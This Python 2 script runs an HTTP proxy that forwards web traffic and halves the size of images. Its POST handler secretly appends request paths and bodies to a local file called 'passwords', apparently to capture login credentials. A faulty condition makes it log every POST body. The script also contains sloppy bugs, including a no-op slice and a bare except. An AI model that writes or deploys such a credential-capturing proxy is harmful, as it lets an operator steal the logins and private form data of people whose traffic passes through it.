#!/usr/bin/env python
import BaseHTTPServer
import cStringIO
import urllib2
from urlparse import urljoin

from PIL import Image

HOST_NAME = ''
PORT_NUMBER = 4567
imgExtensions = {'rgb': 'RGB', 'gif': "GIF", 'pbm': 'PMB', 'pgm': 'PGM', 'ppm': 'PPM',
                 'tiff': 'TIFF', 'rast': 'RAST', 'xbm': 'XBM', 'jpg': 'JPEG', 'jpeg': 'JPEG', 'bmp': 'BMP',
                 'png': 'PNG'}


def is_direct(url):
    if "http" not in url:
        return False
    url = url.split("://")[1].split("/")[0]
    if "." not in url:
        return True
    return True


class Proxy(BaseHTTPServer.BaseHTTPRequestHandler):
    last_http = ''

    def do_GET(self):
        url = self.path
        if url[0] == '/':
            url = url[1:]

       # if is_direct(url):
       #     Proxy.last_http = url
       # else:
       #     if '//' in url:
       #         url = url.split("//")[1]
       #     url = urljoin(Proxy.last_http, url)

        print url
        try:
            url = urllib2.Request(url)
            res = urllib2.urlopen(url, timeout = 20)
            data = res.read()
            headers = res.info()
            self.send_response(200)

            extension = self.path.split('?')[0].split('.')[-1]
            if extension in imgExtensions:
                img = Image.open(cStringIO.StringIO(data))
                resized_img = img.resize([int(0.5 * s) for s in img.size])
                output = cStringIO.StringIO()
                format_of_img = imgExtensions[extension]  # or 'JPEG' or whatever you want
                resized_img.save(output, format_of_img)
                data = output.getvalue()
                output.close()
            headers["content-length"] = str(len(data))
            for h in headers:
                self.send_header(h, headers[h])

            self.end_headers()
            self.wfile.writelines(data)
        except:
            pass

    def do_POST(self):
        url = self.path
        if url[0] == '/':
            url[1:]
        content_length = int(self.headers.getheader('content-length'))
        post_body = self.rfile.read(content_length)

        if "pass" or "login" in post_body:
            with open('passwords', 'a') as f:
                f.write(self.path + "  <--->  " + post_body + "\n")

        req = urllib2.Request(url, post_body)
        res = urllib2.urlopen(req)
        page_data = res.read()
        page_headers = res.info()
        self.send_response(200)

        for h in page_headers:
            self.send_header(h, page_headers[h])
        self.end_headers()
        self.wfile.write(page_data)

httpd = BaseHTTPServer.HTTPServer((HOST_NAME, PORT_NUMBER), Proxy)
httpd.serve_forever()
